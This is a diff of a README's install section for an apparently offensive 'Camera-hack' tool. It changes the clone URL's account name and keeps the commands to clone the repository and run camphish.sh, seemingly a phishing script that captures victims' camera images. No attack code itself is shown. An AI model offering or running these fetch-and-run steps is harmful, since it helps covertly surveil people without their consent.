@@ -36,7 +36,7 @@ apt-get -y install php wget unzip
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/Sainisaabh/Camera-hack.git
+git clone https://github.com/Sainisaabh110/Camera-hack.git
 cd Camera-hack
 bash camphish.sh
 ```
